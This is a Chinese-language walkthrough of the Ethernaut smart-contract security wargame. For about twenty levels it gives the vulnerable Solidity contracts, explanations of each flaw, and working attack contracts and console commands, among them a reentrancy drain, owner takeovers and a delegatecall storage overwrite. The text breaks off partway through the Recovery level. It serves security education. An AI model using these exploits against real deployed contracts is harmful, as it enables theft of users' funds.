# Hello Ethernaut
根据提示一步步来就好：
```js
await contract.info()
await contract.info1()
await contract.info2()
await contract.infonum()
await contract.info42()
await contract.theMethodname()
await contract.method7123949()
await contract.password()
await contract.authenticate("ethernaut0")
```

# Fallback
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
目标是获取 owner 并且把 balance 变为 0。合约在部署时，部署者会成为 owner，并且会有 1000 ether 的初始贡献值。
- contribute() 函数允许用户贡献 小于 0.001 ether 的金额，且如果某个地址的贡献值超过当前 owner 的贡献值，该地址将成为新的 owner。
- receive() 函数允许合约接收以太币，并且如果满足条件（即 msg.value > 0 且 contributions[msg.sender] > 0），将当前调用者设为 owner。

要成为 owner，有两种方法：
- 使用 contribute() 函数，将 contributions[msg.sender] 增加到超过当前 owner 的贡献值。
- 使用 receive() 函数，只要有任何贡献，并发送非零金额的以太币即可成为 owner。

前者显然不太现实，因为需要的 ETH 太多。所以考虑利用 receive() 函数，为了利用 receive() 函数，需要先满足 `contributions[msg.sender] > 0` 条件。 所以 POC 如下：
```solidity
await contract.contribute({value: toWei("0.000001")})
await contract.sendTransaction({value: toWei("0.000001")})
await contract.owner() // 此时已经修改成功
await contract.withdraw()
```
看了其他同学的wp发现还有其他方法：
```solidity
await contract.contribute({value: '100'}) // 不带 toWei 直接单位就是 wei
await contract.send('100')                // 不带 toWei 直接单位就是 wei
```

# Fallout
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```
- 在 Solidity 0.6.0 版本之前，构造函数的名称必须与合约的名称相同。在这个合约中，构造函数名称写作 Fal1out，而不是 Fallout，所以它实际上并不是一个构造函数，而是一个普通的函数。
- 由于这个错误，owner 的初始所有者并没有被正确设置，任何人都可以调用这个 Fal1out 函数并成为 owner。
- 当然，题目之外，本题的合约还有一个问题：任何人都可以通过调用 `function sendAllocation(address payable allocator) public` 退还其他人的 allocation。

```solidity
await contract.Fal1out()
```

# Colin Flip
这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
- 在合约中，blockValue 是通过 blockhash(block.number - 1) 生成的，而 coinFlip 则是blockValue 除以一个常量 FACTOR 得到的结果。因此，coinFlip 的结果是0或1(FACTOR 是一个接近 2^255 的大数。也就是说，blockValue 除以 FACTOR 只可能得到两个值之一：0 或 1)。由于 blockValue 是可预测的（因为 block.number 和 blockhash 在公开区块链上是已知的），所以我们可以计算出 coinFlip 的值，从而预测硬币的结果。
- 编写一个攻击合约来实现这一点，通过攻击合约去调用另一个合约：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public victimContract = ICoinFlip(0x611d16eA5Ac341EB3D588C9d4eb3Bf3856311A88);

    function attack() public  {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victimContract.flip(side);
  }
}
```
在 remix 部署，然后重复调用 10 次即可。
```js
(await contract.consecutiveWins()).words[0] // 查看状态，到 10 即可。
```
补充：57896044618658097711785492504343953926634992332820282019728792003956564819968=2^255，所以这里除以这个数可以实现0/1区分。

# Telephone
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
函数 changeOwner 使用了 tx.origin 和 msg.sender 来决定是否更改 owner。这里的漏洞点在于 tx.origin 和 msg.sender 的区别：
- tx.origin 是最初发起交易的外部账户地址。
- msg.sender 是当前调用该函数的地址。

如果直接调用 changeOwner 函数，tx.origin 和 msg.sender 是相等的，所以不会更改 owner。但如果通过一个中间合约来调用 changeOwner，那么 tx.origin 会是你自己，而 msg.sender 会是中间合约的地址，这时 tx.origin != msg.sender，条件满足，就可以更改 owner。解决思路:编写一个中间合约，通过这个合约去调用 Telephone 合约的 changeOwner 函数，从而满足条件，成功更改 owner。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}


contract Attack {
    ITelephone public victimContract = ITelephone(0xDDe7254d07e97ce1f0BCD2BC3C39841cb9C6B960);

    function attack() public {
        victimContract.changeOwner(msg.sender);
    }
}
```

# Token
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```
需求：你最开始有 20 个 token, 如果你通过某种方法可以增加你手中的 token 数量，你就可以通过这一关，当然越多越好
代码分析：
```solidity
mapping(address => uint256) balances;

function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // 关键漏洞代码：无符号数减法可能会溢出变成一个极大数
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```
- 在 Solidity 0.8.0 之前，如果进行减法运算的结果小于零，实际上会导致数值从一个非常大的数字开始，而不是抛出错误。
- 攻击步骤：调用 transfer 函数，尝试转账比初始余额更多的 token（如 _value 为 21），这将导致整数下溢。


```solidity
await contract.transfer(contract.address,21)
```

# Delegation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```
这道智能合约题目主要涉及了两个合约 Delegate 和 Delegation，考察了 Solidity 中 delegatecall 的使用及其潜在的安全风险。
- delegatecall 是 Solidity 中的一种特殊调用方式，允许一个合约在另一个合约的上下文（包括存储和地址空间）中执行代码。也就是说，delegatecall 执行的是目标合约（这里是 Delegate）的代码，但所有的状态变量和上下文（包括 msg.sender 和 msg.value）是当前合约（即 Delegation）的。
- 因此，在 Delegation 合约中，如果外部传递的数据与 Delegate 中的 pwn 函数匹配，delegatecall 将会执行 Delegate 中的 pwn 函数，但操作的是 Delegation 合约的存储。换句话说，pwn 函数中的 owner = msg.sender 将会更改 Delegation 合约的 owner，而不是 Delegate 合约的 owner。

使用:[abi encoder](https://emn178.github.io/online-tools/keccak_256.html) 计算 `pwn()` 的 abi signatur（前4个字节）`dd365b8b`；
```js
await contract.sendTransaction({data:'dd365b8b'})
```
此外：
```solidity
if (result) {
            this;
        }
```
这段代码似乎无用？

# Force

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
对于一个空合约，没有收款函数，咋一看好像无法转账。在 Solidity 中，通常合约通过 payable 函数接收资金。然而，Force 合约并没有实现任何 payable 函数，这意味着你不能直接通过调用该合约的函数来转账以使合约余额增加。即使合约本身没有 payable 函数，依然可以通过其他方式向合约发送以太币。例如，利用自毁（selfdestruct）的机制，强制向合约地址发送以太币。selfdestruct 会销毁调用的合约，并将合约的剩余余额转移到指定的地址。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    function attack() public payable {
        selfdestruct(payable(address(0x001EFC76D2c63Bc20C4bA266333c76DE2803c7A1)));
    }
}
```

# Vault
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```
- 目标是让 locked = true。虽然密码被声明为私有变量（private），但在以太坊智能合约中，合约的所有数据都是公开存储在区块链上的，所谓的“私有”只是指无法通过合约的接口直接访问。但我们可以通过区块链浏览器或其他调试工具，读取合约的存储状态，从而找到 password 的真实值。
- 我们知道 password 是一个私有的 bytes32 类型的变量，存储在合约的状态变量中。根据 Solidity 的存储布局规则，password 变量会存储在某个固定的槽位中。使用 `web3.eth.getStorageAt(contractAddress, index)` 可以读取这个值。

```js
await web3.eth.getStorageAt(instance, 1)
// 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
await web3.eth.getStorageAt(instance, 1).then(web3.utils.toAscii)
// A very strong secret password :)
// 补充： 通过 web3.utils.toAscii / web3.utils.toHex 可以转为可见字符或者/bytes
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

# King
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
合约通过发送超过当前 prize 的以太坊成为“国王”（king），而被推翻的国王将获得 prize 的奖励。这是一种类似于庞氏骗局的游戏机制，游戏的设计鼓励参与者不断增加 prize 以争夺国王的位置。
攻击目标是破坏这个合约，即在成为新的国王后，其他人也不能通过发送更高的 prize 夺取国王的位置。并且 submit 时也会尝试夺权，如果夺权失败则通关。
- 合约中的潜在问题在于：当新的国王被推翻时，旧的国王会收到 prize。如果接收 prize 的操作失败，receive() 函数中的流程就会失败，国王位置将不会被更新。因此，可以利用一种方式阻止国王接收 prize，从而阻止其他人替代国王。部署一个智能合约，该合约的 receive() 函数拒绝接受以太坊，从而导致 King 合约在调用 payable(king).transfer() 时失败。

```js
// 查看当前 prize
(await contract.prize()).toNumber()
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address payable kingContract;

    constructor(address payable _kingContract) payable {
        kingContract = _kingContract;
    }

    function attack() public payable {
        // 向 King 合约发送超过当前 prize 的以太坊，成为国王
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // 通过阻止接收以太坊来破坏 King 合约
    receive() external payable {
        revert("Cannot become king");
    }
}
```

# Re-entrancy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

这道题是经典的重入漏洞；Reentrance 合约的 withdraw 函数在确保调用者有足够余额后，会将资金发送到调用者的地址。关键是在发送资金和更新余额之间，由于使用 call 方法，合约允许调用者的回退（fallback）方法执行，从而可能再次调用 withdraw 函数。如果回退方法中再次调用 withdraw，并且合约状态尚未更新，这将导致重入攻击。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    IReentrance public victimContract = IReentrance(0xFd0d5031eA1e5169a6C080a30069042a10CbC59b);
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {
        if (address(victimContract).balance >= 0.001 ether) {
            victimContract.withdraw(0.001 ether);
        } else if (address(victimContract).balance > 0 ether){ // 这里后面修改了一下，就不会出 out of gas 的问题，但 out of gas 也会攻击成功
            victimContract.withdraw(address(victimContract).balance);
        }
    }

    function attack() public payable {
        victimContract.donate{value: 0.001 ether}(address(this));
        victimContract.withdraw(0.001 ether);
    }

    function getFunds() public {
       payable(owner).transfer(address(this).balance);
    }
}
```
Attack 的时候传 0.001 ether 即可。

# Elevator

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
目标让 top 变成 true。下面这一段代码看起来是无法满足的，但 building 合约是自己控制的，可以在里面反转 isLastFloor 的返回值，先返回 false 然后返回 true。
```solidity
if (!building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;    
}

contract Attack {
    IElevator public victimContract = IElevator(0xB85c9b8D0499B6D143675FF579755d2dEEaccDEa);
    bool public toggle = true;

    constructor(){}
    
    function isLastFloor(uint256) public returns (bool){
        toggle = !toggle;
        return toggle;
    }

    function attack() public payable {
        victimContract.goTo(1);
    }
}
```

这个题 goTo 传多少都没意义，关键是控制 isLastFloor 返回符合目标合约的约束。

# Privacy
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```
目标是解锁这个合约。要解锁合约，我们需要找到一个 bytes16 的 _key，该密钥必须与 data[2] 的前 16 字节相同。也就是说，合约的解锁机制依赖于 data[2] 的内容。
- 在 Solidity 中，状态变量是按顺序存储在合约的存储槽（slots）中的。每个存储槽的大小为 32 字节（256 位）。我们可以利用这一点通过读取合约的存储来获取 data[2] 的内容。以下是 Solidity 中变量的存储规则：
    - 每个 uint256 或 bytes32 类型的变量独占一个存储槽。
    - 较小的数据类型（如 uint8 和 uint16）可以合并存储在同一个槽中，直到占满 32 字节。
- 存储布局分析：根据代码，变量的存储分布如下
    - locked（bool 类型）占用第 0 槽的第 1 位。
    - ID（uint256 类型）占用第 1 槽。
    - flattening, denomination, 和 awkwardness（uint8 和 uint16 类型）会合并到第 2 槽。
    - data[0], data[1], 和 data[2] 分别占用第 3、4、5 槽。
    - 我们需要的是 data[2]，它位于存储槽 5 中。

```js
await web3.eth.getStorageAt("0xCe702b10A17D441216cdA807c7b93E6d787479c6", 5);
// 0x9a7cc95f3d89c118afdf08eba0a9246c60140b408ab6c80594f28e79a9f97ed3
"0x9a7cc95f3d89c118afdf08eba0a9246c60140b408ab6c80594f28e79a9f97ed3".slice(0,34) // include "0x"
await contract.unlock("0x9a7cc95f3d89c118afdf08eba0a9246c")
await contract.locked()
```
- bytes 类型表示一个定长或变长的字节数组。在 Solidity 中，字节数组从高位（即数组的开头）开始存储。当进行从大类型到小类型的转换时，bytes 是截取前面的字节（即高位部分）。bytes 数组是字节序列，按照大端字节序（big-endian）方式存储。大端表示法意味着最左边的字节是最高有效位，因此在截取时保留的是高位部分。
- uint（无符号整数）类型表示一个数值，在内存中的表示方式是数值的二进制形式。当对 uint 进行类型转换时，Solidity 选择截取数值的低位，因为低位是数值的有效部分。

# Gatekeeper One

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
- `gasLeft()`: [docs](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties)
```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```
这个条件要求 msg.sender 不等于 tx.origin。这意味着你需要通过另一个合约来调用 GatekeeperOne 合约。
```solidity
modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
}
```
这个条件要求在执行该modifier时剩余的gas量必须是 8191 的倍数。这个条件非常棘手，通过循环去不断尝试。
```solidity
modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
}
```
`bytes 本身是大端序，如果 bytes 和 uint 进行类型转换，数据本身不会发生变化，但数据的解读方式需要按对方的方式来进行解读。` 这里的要求是构造一个特定的 bytes8 类型的 _gateKey，它需要通过以下三个条件：
- 条件1：uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) 这个条件要求 _gateKey 的低32位的前16位必须为0，以使得低32位的值等于低16位的值。
- 条件2：uint32(uint64(_gateKey)) != uint64(_gateKey) 这个条件要求 _gateKey 的高32位必须不为零。换句话说，整个 _gateKey 必须大于 2^32，从而 uint32(uint64(_gateKey)) 和 uint64(_gateKey) 不相等。
- 条件3：uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)) 这个条件要求 _gateKey 的低16位等于 tx.origin（交易发起者地址）的低16位。

综上可以如下构造：
```solidity
bytes8 _gateKey = bytes8((uint32(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)|0xFFFFFFFF00000000);
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns(bool);
}

contract GatekeeperOneExploit {
    IGatekeeperOne public gatekeeper = IGatekeeperOne(0x9aA2db5838cBEF21BD6bC21E465B5973e5155b68);

    constructor() {}

    function exploit() public {
        bytes8 _gateKey = bytes8((uint32(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)|0xFFFFFFFF00000000);
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(gatekeeper).call{gas: 8191 * 10 + i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}
```

# Gatekeeper Two
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
题目相关资料：
- [solidity cheatsheet](https://docs.soliditylang.org/en/v0.4.23/miscellaneous.html#cheatsheet)
- [solidity assembly](https://docs.soliditylang.org/en/v0.4.23/assembly.html)

gateOne 同理，通过代理合约即可。gateTwo 的 extcodesize, 它返回 caller() 的合约代码大小。
```solidity
modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller()) // 内联汇编，caller() 相当于 msg.sender()，extcodesize 用于获取指定地址上存储的合约代码大小
        }
        require(x == 0);
        _;
    }
```
- 要求调用者的合约代码大小为0，意味着在调用这个合约时，调用者合约还没有部署完整。在 Solidity 中，当合约构造函数正在执行时，合约的代码还没有完全部署，extcodesize 会返回0。因此，我们可以在合约的构造函数中完成对 GatekeeperTwo 的调用，绕过这一检查；
- gateThree 看似复杂，但异或其实很简单：`_gateKey = uint64(keccak256(msg.sender)) ^ type(uint64).max`；

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns(bool);
}

contract Attack {
    IGatekeeperTwo public gatekeeper = IGatekeeperTwo(0xFC25F472366970CB5587aE22e4AACFbb02FBc589);

    constructor() {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeper.enter(gateKey);
    }
}
```

# Naught Coin
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin'; // 调用父类构造函数传进去的
    // string public constant symbol = '0x0'; // 调用父类构造函数传进去的
    // uint public constant decimals = 18; // 这里的注释指的是 ERC20 的默认逻辑
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals())); // decimals() 默认值18，这里是发放 1000000 枚token 的意思
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY); // 实现了上面注释的逻辑
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```
目标是将我的地址余额变为0。由于 transfer 被时间锁限制，我们需要找到一种可以绕过 transfer 函数的方式。这个题需要一些关于 ERC20 的背景知识：
- ERC20 代码: [github](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol)
- [ERC20-标准源代码-语法导读](https://github.com/SeeDAO-OpenSource/DEV-NoviceVillage/blob/master/1.%E7%BB%BC%E5%90%88%E6%80%A7%E7%90%86%E8%A7%A3/Token/ERC20-%E6%A0%87%E5%87%86%E6%BA%90%E4%BB%A3%E7%A0%81-%E8%AF%AD%E6%B3%95%E5%AF%BC%E8%AF%BB.md)

阅读完上述材料后我们知道，除了 transfer，还有 approve 和 transferFrom。虽然合约限制了 transfer 函数，但并没有限制 approve 和 transferFrom 函数。ERC20 除了直接 transfer 之外，为了可组合性，还实现了授权转账功能。我们可以利用授权转账功能来绕过 token lock。

```js
await contract.approve(player, toWei("1000000"))
await contract.transferFrom(player, instance, toWei("1000000"))
```

# Preservation
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }
    
    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```
- 这道题的核心在于利用delegatecall的上下文保留机制，通过调用外部合约代码来操作当前合约的存储布局，从而实现攻击目标。delegatecall 修改的本质上是 Preservation 中的变量。

首先需要理解 Preservation 合约的存储结构：
- timeZone1Library - 存储在 slot 0
- timeZone2Library - 存储在 slot 1
- owner - 存储在 slot 2
- storedTime - 存储在 slot 3

在 LibraryContract 中，只有一个状态变量： storedTime - 存储在 slot 0。setTime 实际上修改的是 address public timeZone1Library。

编写并部署一个恶意合约 MaliciousLibrary，该合约与 LibraryContract 有相同的函数签名 setTime(uint256)，但它将操作 Preservation 合约的存储槽 2（即 owner 变量），并将 owner 替换为攻击者的地址。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousLibrary {
    function setTime(uint256) public {
        address attacker = address(uint160(msg.sender));
        assembly {
            sstore(2, attacker) // sstore(slot, value)，使用 sstore 可以绕过 Solidity 对变量访问的限制，例如在没有声明对应的状态变量时直接修改存储槽的值。
        }
    }
}
```

```js
await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7")
await contract.timeZone1Library()
// 0x6b14047235Ae884f97bb15aba68d40D951A2a9F7
await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7") // 随便传参数反正不会用
await contrcat.owner()
```
- 除了上面的 sstore 之外，也可以在攻击合约里模仿 Preservation 的变量定义然后直接修改对应的 owner 变量；

# Recovery
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        new SimpleToken(_name, msg.sender, _initialSupply);
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint256) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
```
要解决这个问题，我们需要从由 Recovery 合约部署的丢失的 SimpleToken 合约中取回 0.001 ether。关键步骤如下：
- 理解合约地址如何生成：当一个合约使用 CREATE 操作码（在 Solidity 中通过 new 关键字）创建另一个合约时，新合约的地址是根据创建者的地址和他们当时的 nonce（交易次数）确定性计算出来的。
- 计算丢失合约的地址：因为 SimpleToken 合约是 Recovery 合约创建的第一个（也是唯一一个）合约，所以当时的 nonce 是 1。我们可以利用这个信息和 Recovery 合约的地址来计算丢失的合约地址。
```solidity
function computeLostContractAddress(address _creator, uint _nonce) public pure returns (address) {
    bytes memory data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), _creator, uint8(_nonce));
    bytes32 hash = keccak256(data);
    return address(uint160(uint(hash)));
}
```
或者
```js
const ethers = require('ethers');

const recoveryAddress = '0xYourRecoveryContractAddress';
const nonce = 1;
